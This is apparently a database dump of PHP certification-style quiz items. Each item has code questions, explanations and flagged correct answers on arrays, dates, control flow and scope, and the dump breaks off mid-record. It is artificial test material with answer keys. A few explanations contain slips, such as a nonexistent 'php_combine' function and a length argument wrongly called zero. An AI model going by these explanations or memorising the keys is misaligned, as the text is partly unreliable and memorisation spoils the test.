	(123,11,60,'Consider the following code:\r\n.....at will be the output?','<p><span>Consider the following code:</span></p>\r\n<p><span><pre><?php\r\n$array = array(\"a1\"=>x,\"a2\"=>e,\"a3\"=>z);\r\nasort( $array );\r\n \r\nforeach ( $array as $keys => $values ) {\r\nprint \"$keys = $values \";\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The asort() function accepts an associative array and sorts its values either alphabetically if any strings are present or numerically if all elements are numbers. However, the asort() function preserves the array keys. Consider the following example:</span></p>\r\n<p><span><pre><?php\r\n    $array = array(\"a1\"=>\'x\',\"a2\"=>\'e\',\"a3\"=>\'z\');\r\n    asort( $array );\r\n    foreach ( $array as $keys => $values )\r\n    {\r\n         print \"$keys = $values<br />\";\r\n    }\r\n?> </pre></span></p>\r\n<p><span>Output:</span></p>\r\n<pre>a2 = e<br />a1 = x<br />a3 = z</pre>\r\n<pre></pre>\r\n<pre><span>In the output, the array keys are preserved and array elements are sorted in the same way as in the sort() function.</span></pre>\r\n<p><span><br /></span></p>','[{\"content\":\"a2 = e a1 = x a3 = z\",\"correct\":1},{\"content\":\"a1 = e a2 = x a3 = z\",\"correct\":0},{\"content\":\"0 = e 1 =x 2 = z\",\"correct\":0},{\"content\":\"The script will throw an error message.\",\"correct\":0}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:24'),
	(124,11,76,'What will be the output of the following .....3,6),array(4,5,6));\r\n?>','<p><span>What will be the output of the following PHP code?</span></p>\r\n<p><span><pre><?php\r\narray_combine(array(1,2,3,6),array(4,5,6));\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The array_combine() function is used to combine two arrays. It uses the first array as a key and the second array as a value. For example,</span><br /><br /><span>You want to run the following PHP code:</span></p>\r\n<p><span><span class=\"pln\">array_combine</span><span class=\"pun\">(</span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">1</span><span class=\"pun\">,</span><span class=\"lit\">2</span><span class=\"pun\">,</span><span class=\"lit\">3</span><span class=\"pun\">,</span><span class=\"lit\">6</span><span class=\"pun\">),</span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">4</span><span class=\"pun\">,</span><span class=\"lit\">5</span><span class=\"pun\">,</span><span class=\"lit\">6</span><span class=\"pun\">));</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>Here, the php_combine() function creates an array by using one array for keys and another for its values and gives the following array as the output:</span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">1</span><span class=\"pun\">=&gt;</span><span class=\"lit\">4</span><span class=\"pun\">,</span><span class=\"lit\">2</span><span class=\"pun\">=&gt;</span><span class=\"lit\">5</span><span class=\"pun\">,</span><span class=\"lit\">3</span><span class=\"pun\">=&gt;</span><span class=\"lit\">6</span><span class=\"pun\">)</span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pun\"><br /></span></span></span></span></p>\r\n<p><span><span class=\"pun\"><span><span class=\"pun\"><uc:kwd>Note: Both parameters of the array_combine() function should have an equal number of elements, otherwise it will produce a warning message.</uc:kwd><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-combine.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-combine.php</a></uc:ref></span></span></span></span></p>','[{\"content\":\"array(1,2,3,4,5,6)\",\"correct\":0},{\"content\":\"array(1=>4,2=>5,3=>6)\",\"correct\":0},{\"content\":\"array(1=>2,3=>4,5=>6)\",\"correct\":0},{\"content\":\"Warning message\",\"correct\":1}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:25'),
	(125,11,64,'You run the following PHP script:','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$array1 = array (\"a\", \"b\", \"c\", \"d\", \"e\", \"f\");\r\n$array2 = array_slice($array1, -3);\r\n \r\nforeach ( $array2 as $val ) {\r\n    print \"$val \";\r\n}\r\n?></pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the above script, the offset argument is negative and the length argument is zero. Due to the negative offset argument, it will slice the array from the 3rd last element from the end. Besides this, since the length argument of the array_slice() function is 0, it will slice up to the end of the array.</span><br /><br /><span>The array_slice() function is used to extract a chunk of an array. The syntax of the array_slice() function is as follows:</span></p>\r\n<p><span><span class=\"pln\"> array array_slice </span><span class=\"pun\">(</span><span class=\"pln\"> array $array </span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $offset </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $length </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">bool</span><span class=\"pln\"> $preserve_keys </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">false</span><span class=\"pln\"> </span><span class=\"pun\">]]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></p>\r\n<p><span><span class=\"pun\">where,</span></span></p>\r\n<p><span><span class=\"pun\"><br class=\"Apple-interchange-newline\" /></span></span></p>\r\n<table>\r\n<tbody>\r\n<tr><th>Option</th><th>Description</th></tr>\r\n<tr>\r\n<td>array</td>\r\n<td>It is the input array.</td>\r\n</tr>\r\n<tr>\r\n<td>offset</td>\r\n<td>If offset is positive, the sequence starts from that offset in the array. If offset is negative, the sequence starts from the end of the array.</td>\r\n</tr>\r\n<tr>\r\n<td>length</td>\r\n<td>If the length is omitted, array_slice() assumes that the user wants all elements from the starting position onward returned.</td>\r\n</tr>\r\n<tr>\r\n<td>preserve_keys</td>\r\n<td>When this option is used, array_slice() preserves the keys and does not reorder them.</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><span><span class=\"pun\"><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-slice.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-slice.php</a></uc:ref><br /></span></span></p>','[{\"content\":\"d e f\",\"correct\":1},{\"content\":\"c d e\",\"correct\":0},{\"content\":\"b c d \",\"correct\":0},{\"content\":\"a b c\",\"correct\":0}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:27'),
	(126,11,65,'You run the following PHP script:','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$array1 = array (\'a\' => 20, 30, 35);\r\n$array2 = array (\'b\' => 20, 35, 30);\r\n$array = array_intersect_assoc ($array1, $array2);\r\nvar_dump ($array);\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_intersect_assoc() function checks whether the index keys as well as their respective key values between/among the given arrays are the same or not. For example, a PHP script is given as follows:</span></p>\r\n<p><span><pre><?php\r\n    $array1 = array (\'a\' => 20, 30, 35);\r\n    $array2 = array (\'b\' => 20, 35, 30);\r\n    $array = array_intersect_assoc ($array1, $array2);\r\n    var_dump ($array);\r\n?> </pre></span></p>\r\n<p><span><br /><span>However, all values in $array1 and $array2 are the same and their respective index keys are not the same. Hence, the output of the above script will be</span></span></p>\r\n<p><span><span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">0</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"pln\"> </span><span class=\"pun\">}</span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span>which means that there will be no element in $array since the index keys of $array1 are not equal to the index keys of $array2.</span><br /><br /><span>Here is another example:</span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><pre> <?php\r\n    $array1 = array (\'a\' => 20, 30, 35);\r\n    $array2 = array (\'a\' => 20, 35, 30);\r\n    $array = array_intersect_assoc ($array1, $array2);\r\n    var_dump ($array);\r\n?> </pre></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span>The output of the above script will be:</span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\">{</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"str\">\"a\"</span><span class=\"pun\">]=&gt;</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pun\">(</span><span class=\"lit\">20</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">}</span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><br /></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span>since there is one index key and its respective value (\'a\' =&gt; 20) is the same in both arrays, i.e., $array1 and $array2.&nbsp;</span><br /><br /><span>Answer option B is incorrect. You can retrieve this output when you are using the array_intersect() function instead of the array_intersect_assoc() function. The array_intersect() function extracts all the elements that are common for two or more arrays. Since this function only checks whether the values are the same, the index keys of arrays are ignored. For example, a user runs the following script:</span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><pre><?php\r\n    $array1 = array (\'a\' => 20, 30, 35);\r\n    $array2 = array (\'b\' => 20, 35, 30);\r\n    $array = array_intersect($array1, $array2);\r\n    var_dump ($array);\r\n?> </pre></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><br /></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><span>The output of the above script will be:</span></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">3</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"str\">\"a\"</span><span class=\"pun\">]=&gt;</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pun\">(</span><span class=\"lit\">20</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"lit\">0</span><span class=\"pun\">]=&gt;</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pun\">(</span><span class=\"lit\">30</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"lit\">1</span><span class=\"pun\">]=&gt;</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pun\">(</span><span class=\"lit\">35</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">}</span></span></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><span><span class=\"pun\"><br /></span></span></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><span><span class=\"pun\"><br /><span>since three elements (20, 30, 35) are common in both arrays, i.e., $array1 and $array2.&nbsp;</span><br /><br /><span>Answer options C and D are incorrect. These are invalid outputs.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-intersect-assoc.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-intersect-assoc.php</a></uc:ref></span></span></span></span></span></span></span></span></span></p>','[{\"content\":\"array(0) { }\",\"correct\":1},{\"content\":\"array(3) { [\\\"\'a\'\\\"]=> int(20) [0]=> int(30) [1]=> int(35) }\",\"correct\":0},{\"content\":\"array(1) { [\\\"\'a\'\\\"]=> int(20)}\",\"correct\":0},{\"content\":\"The script will throw an error message.\",\"correct\":0}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:29'),
	(127,11,18,'John works as a Website Developer for PHP.....\n','<p><span>John works as a Website Developer for PHPWEB Inc. He is using a Windows operating system and is also working on PHP engine 5.0. He develops the following script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n         echo date(\"M-d-Y\", mktime(0, 0, 0, 12, 32, 1965));\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output of the above PHP script?</span></span></p>\r\n<p><span><span><br /></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>According to the scenario, John is working on a Windows operating system and his PHP engine version is 5.0, which is prior to PHP version 5.1. Hence, the output of the script will be -1 with a warning message, and it will not display Jan-01-1966.</span></p>\r\n<p><span><span>The&nbsp;</span><b>mktime()</b><span>&nbsp;function is a timestamp function that is useful for date arithmetic and validation. It automatically calculates the correct value for an out-of-range input. The syntax of mktime() is as follows:</span></span></p>\r\n<p><span><span><span class=\"kwd\">int</span><span class=\"pln\"> mktime </span><span class=\"pun\">([</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $hour </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $minute </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $second </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $month </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $day </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $year </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $is_dst </span><span class=\"pun\">]]]]]]]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></span></p>\r\n<p><span><span><span class=\"pun\"><uc:hed>Note:</uc:hed><span>&nbsp;The range of valid years in the mktime() function is limited to 1970 through 2038 before PHP 5.1.</span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><br /></span></span></span></span></p>','[{\"content\":\"<p><span>-1 and warning<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p><span>Jan-01-1966<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Jan-01-1964<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Date out of range error<\\/span><\\/p>\",\"correct\":0}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:30'),
	(128,11,63,'You run the following script:\r.....at will be the output?','<p><span>You run the following script:</span></p>\r\n<p><span><pre><?php\r\n \r\n$array1 = array (\"a\", \"b\", \"c\", \"d\", \"e\", \"f\");\r\n$array2 = array_slice($array1, 2, 2);\r\n \r\nforeach ( $array2 as $val ) {\r\n    print \"$val \";\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><span><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>This script prints the elements \'c\', and \'d\'. The array_slice() function is used to extract a chunk of an array. The syntax of the array_slice() function is as follows:</span></span></p>\r\n<p><span><span class=\"pln\"> array array_slice </span><span class=\"pun\">(</span><span class=\"pln\"> array $array </span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $offset </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $length </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">bool</span><span class=\"pln\"> $preserve_keys </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">false</span><span class=\"pln\"> </span><span class=\"pun\">]]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></p>\r\n<p><span>where,</span><br /><br /></p>\r\n<table>\r\n<tbody>\r\n<tr><th>Option</th><th>Description</th></tr>\r\n<tr>\r\n<td>array</td>\r\n<td>It is the input array.</td>\r\n</tr>\r\n<tr>\r\n<td>offset</td>\r\n<td>If offset is positive, the sequence starts from that offset in the array. If offset is negative, the sequence starts from the end of the array.</td>\r\n</tr>\r\n<tr>\r\n<td>length</td>\r\n<td>If the length is omitted, array_slice() assumes that the user wants all elements from the starting position onward returned.</td>\r\n</tr>\r\n<tr>\r\n<td>preserve_keys</td>\r\n<td>When this option is used, array_slice() preserves the keys and does not reorder them.</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-slice.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-slice.php</a></uc:ref></p>','[{\"content\":\"c d\",\"correct\":1},{\"content\":\"a b\",\"correct\":0},{\"content\":\"b c\",\"correct\":0},{\"content\":\"d e\",\"correct\":0}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:32'),
	(129,11,25,'Which of the following types of errors ha.....script and cannot be trapped?','<p><span>Which of the following types of errors halts the execution of a script and cannot be trapped?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>A fatal error is one that halts the execution of a script and cannot be trapped.</span><br /><br /><span>Answer option B is incorrect. A warning is a recoverable error that indicates a run-time fault, but it does not halt the execution of the script.</span><br /><br /><span>Answer option C is incorrect. A notice is an indication that an error condition has occurred, but it is not necessarily significant. It does not halt the execution of the script.</span><br /><br /><span>Answer option D is incorrect. A compile-time error is detected by the parser while it is compiling a script.</span></p>','[{\"content\":\"<p><span>Fatal error<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p><span>Warning<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Notice<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Compile-time error<\\/span><\\/p>\",\"correct\":0}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:37'),
	(130,11,46,'You want to create an anonymous function .....iv>\r\n','<p><span>You want to create an anonymous function in the middle of a script that will return the square of a given number. Which of the following PHP scripts can you use to accomplish the task?</span><br /><br /></p>\r\n<div class=\"factinstruction\">Each correct answer represents a complete solution. Choose two.</div>\r\n<div class=\"factinstruction\"></div>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>The create_function() function is used to create an anonymous function in PHP. This function call creates a new randomly named function and returns its name (as a string). Consider the following example:</span></p>\r\n<p><span><pre><?php\r\n      $foo = create_function(\'$x\', \'return $x*$x;\');\r\n      $bar = create_function(\"\\$x\", \"return \\$x*\\$x;\");\r\n      echo $foo(10); \r\n?></pre></span></p>\r\n<p><span><span>It is important to note that the argument list and function body must be in single quotes or the dollar signs must be escaped. Otherwise PHP will assume \"$x\" means the variable $x and will substitute it into the string (despite possibly not existing) instead of leaving \"$x\" in the string. For functions with quotes or functions with lots of variables, it can get quite tedious to ensure the intended function body is what PHP interprets.</span><br /><br /><span>Answer options C and D are incorrect. These are not valid answers according to the script.</span></span></p>','[{\"content\":\"<?php $foo = create_function(\'$x\', \'return $x*$x;\'); echo $foo(10); ?>\",\"correct\":1},{\"content\":\"<?php $foo = create_function(\\\"\\\\$x\\\", \\\"return \\\\$x*\\\\$x;\\\"); echo $foo(10); ?>\",\"correct\":1},{\"content\":\"<?php $foo = create_function(\\\"$x\\\", \\\"return $x*$x;\\\"); echo $foo(10); ?>\",\"correct\":0},{\"content\":\"<?php $foo = create_function(\\\"$x\\\", \\\"$x*$x;\\\"); echo $foo(10); ?>\",\"correct\":0}]',1,0,'2012-11-19 00:11:19','2012-11-19 00:11:39'),
	(131,12,59,'Consider the following PHP script:..... output of the script?','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n    $var1 = array(\"foo\", \"bar\", \"hello\", \"world\", \"PHP\", \"nice\");\r\n    $var2 = array(\"foo\", \"bar\", \"hello\", \"PHP\", \"nice\", \"language\");\r\n    echo count( array_merge(array_diff($var1,$var2),array_diff($var2,$var1)));\r\n?></pre></span></p>\r\n<p><span><span>What will be the output of the script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The array_diff() function is used to calculate the difference between two arrays. Here, when array_diff($var1,$var2) will be called, output will be \"world\". The output of the array_diff($var2, $var1) will be \"language\". So when the array_merge function merges these two outputs, the new array contains two elements \"world\", \"language\" respectively.</span><br /><br /><span>Answer options A, C, and D are incorrect. These are not valid output of the given script.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.types.array.php\" tabindex=\"-1\">http://php.net/manual/en/language.types.array.php</a></uc:ref></p>','[{\"content\":\"1\",\"correct\":0},{\"content\":\"2\",\"correct\":1},{\"content\":\"3\",\"correct\":0},{\"content\":\"4\",\"correct\":0}]',1,1,'2012-11-19 14:20:32','2012-11-19 14:20:52'),
	(132,12,12,'Mark works as a Web Developer for Unicorn..... output of the script?','<p><span>Mark works as a Web Developer for Unicorn Inc. He develops an application in PHP using the following code:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n      switch(1) {\r\n      case 1: print(\"Book Details<br>\"); \r\n      case 2: print(\"Book Author<br>\"); \r\n      default: print(\"Missing Book<br>\");\r\n      }\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output of the script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The given script will run successfully and will display all the three lines as output. The switch expression has the value 1; this is matched with the literal value specified in each case statement. The statement \"Book Details\" has the matching value, but since there is no break statement after this, all the statements after matching the literal value get executed.</span><br /><br /><span>If a break statement was given after case 1:, the statement \"Book Details\" would have been displayed.</span></p>','[{\"content\":\"<p><span>Book Details<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Book Author<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>Missing Book<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>It will display all the three lines.<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p><span>The script will throw an error.<\\/span><\\/p>\",\"correct\":0}]',1,0,'2012-11-19 14:20:32','2012-11-19 14:20:55'),
	(133,12,72,'You have given the following PHP code:','<p><span>You have given the following PHP code:</span></p>\r\n<p><span><pre><?php\r\nclass Example {\r\n    public $public = \'1\';\r\n    private $prv   = \'2\';\r\n    protected $prt = \'3\';\r\n}\r\n \r\n$arrayobj = new ArrayObject(new Example());\r\nvar_dump($arrayobj->count());\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The ArrayObject::count() method is used to get the number of public properties in ArrayObject. Since in this example, there is only one public property, the ArrayObject::count() method will count only one property.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/arrayobject.count.php\" tabindex=\"-1\">http://in2.php.net/manual/en/arrayobject.count.php</a></uc:ref></p>','[{\"content\":\"int(2)\",\"correct\":0},{\"content\":\"int(1)\",\"correct\":1},{\"content\":\"int(3)\",\"correct\":0},{\"content\":\"int(0)\",\"correct\":0}]',1,0,'2012-11-19 14:20:32','2012-11-19 14:20:58'),
	(134,12,14,'You work as a Web Developer for Remote In.....   print(\"false\");\r\n?> ','<p><span>You work as a Web Developer for Remote Inc. What will be the output when you try to run the script below?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n    $b = false;\r\n    if($b = true)\r\n      print(\"true\");\r\n    else\r\n      print(\"false\");\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The only legal expression in an if statement is a boolean expression or an expression that results in a boolean variable. In the above example, the value true is assigned to the variable x. The result of any assignment expression is the value of the variable following the assignment; hence, \"true\" will be the output.&nbsp;</span><br /><br /><span>The if-else statement is a conditional statement. It is used to execute a statement or group of statements based on some condition.&nbsp;</span><br /><br /><span>The general format of the statement is given below:</span></p>\r\n<p><span><pre><?php\r\nif(boolean_expression)\r\n{\r\n  statements;\r\n} else {\r\n  statements;\r\n}\r\n?></pre></span></p>\r\n<p><span><span>The else clause is optional.</span></span></p>\r\n<p><span><span><span>Answer options B, C, and D are incorrect. The given script runs successfully and displays true as output.</span></span></span></p>','[{\"content\":\"<p><span>true<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p>true<\\/p>\",\"correct\":0},{\"content\":\"<p><span>true false<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>The script will throw an error message.<\\/span><\\/p>\",\"correct\":0}]',1,0,'2012-11-19 14:20:32','2012-11-19 14:21:01'),
	(135,12,51,'Consider the following PHP script:.....Mul();\r\nprint($b);\r\n?> ','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$a = 5;\r\n$b = 10;\r\n \r\nfunction Mul()\r\n{\r\n$a =0;\r\n    $b = $a * $b;\r\n}\r\n \r\nMul();\r\nprint($b);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>In the above script, the values of $a and $b outside of the function Mul() will not affect the values inside the function and the values of $a and $b in the function Mul() will not affect the values outside the function scope. Hence, the script will print the value 10 that is assigned to $b in the third line of the script.</span></p>\r\n<p><span><span>Variable scope describes where in a program\'s text the variable may be used, while the extent (or lifetime) describes when in a program\'s execution a variable has a value. PHP has three types of variable scopes:</span><br /><br /></span></p>\r\n<ol>\r\n<li><uc:hed>Function Scope:&nbsp;</uc:hed>Variable scope exists within the function where the variable was defined.</li>\r\n<li><uc:hed>Global Scope:&nbsp;</uc:hed>Variable scope exists everywhere in the PHP script.</li>\r\n<li><uc:hed>Class Scope:&nbsp;</uc:hed>Variable scope exists within a class where the variable was defined.</li>\r\n</ol>\r\n<div><span>Answer options A, C, and D are incorrect. These are not valid answer options.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.variables.scope.php\" tabindex=\"-1\">php.net/manual/en/language.variables.scope.php</a></uc:ref></div>\r\n<p><span><br /></span></p>','[{\"content\":\"50\",\"correct\":0},{\"content\":\"10\",\"correct\":1},{\"content\":\"0\",\"correct\":0},{\"content\":\"The script will return an error message.\",\"correct\":0}]',1,1,'2012-11-19 14:20:32','2012-11-19 14:21:05'),
	(136,12,5,'Which of the following statements explain.....e between print() and echo()?','<p><span>Which of the following statements explains the difference between print() and echo()?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>However, print () and echo() show same behavior most of the time, there is quite difference between them. print () is a language construct that behaves like a function with its own return value so you can use it as an expression. echo() is a language construct that has no return value so you cannot use it as an expression.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.echo.php\" tabindex=\"-1\">http://php.net/manual/en/function.echo.php</a></uc:ref></p>','[{\"content\":\"<p><span>You can use print() as part of an expression while you cannot use echo().<\\/span><\\/p>\",\"correct\":1},{\"content\":\"<p><span>You can use print() to print numbers while you cannot use echo for this.<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>You cannot use echo() with bitwise operators but you can use print() for this.<\\/span><\\/p>\",\"correct\":0},{\"content\":\"<p><span>There is no difference between echo() and print() functions.<\\/span><\\/p>\",\"correct\":0}]',1,0,'2012-11-19 14:20:32','2012-11-19 14:21:07'),
	(137,12,9,'Consider the following code:\r\n.....$i;\r\n    }\r\n    print($x);\r\n?>','<p><span>Consider the following code:</span></p>\r\n<p><pre><?php\r\n    $x=0;\r\n    $i;\r\n    for($i=0;$i<5;$i++)\r\n    {\r\n        $x+=$i;\r\n    }\r\n    print($x);\r\n?></pre></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The loop will run from 0 to 4. With each execution, the value of i will be incremented by one. The value will then be added and assigned to x. After the completion of the loop, the value of x will be 10.</span></p>','[{\"content\":\"<p>7<\\/p>\",\"correct\":0},{\"content\":\"<p>8<\\/p>\",\"correct\":0},{\"content\":\"<p>9<\\/p>\",\"correct\":0},{\"content\":\"<p>10<\\/p>\",\"correct\":1}]',1,0,'2012-11-19 14:20:32','2012-11-19 14:21:10'),
	(138,12,26,'&nbsp;Consider the following script:','<p><span>&nbsp;Consider the following script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n         echo date(\"M-d-Y\", mktime(0, 0, 0, 12, 32, 1995));\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output of the above script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Since the given input date is out of range, it will automatically correct it. Hence, the correct answer will be Jan-01-1996.</span></p>\r\n<p><span><span>The&nbsp;</span><b>mktime()</b><span>&nbsp;function is a timestamp function that is useful for date arithmetic and validation. It automatically calculates the correct value for an out-of-range input. The syntax of mktime() is as follows:</span></span></p>\r\n<p><span><span><span class=\"kwd\">int</span><span class=\"pln\"> mktime </span><span class=\"pun\">([</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $hour </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $minute </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $second </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $month </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $day </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $year </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $is_dst </span><span class=\"pun\">]]]]]]]</span><span class=\"pln\"> </span><span 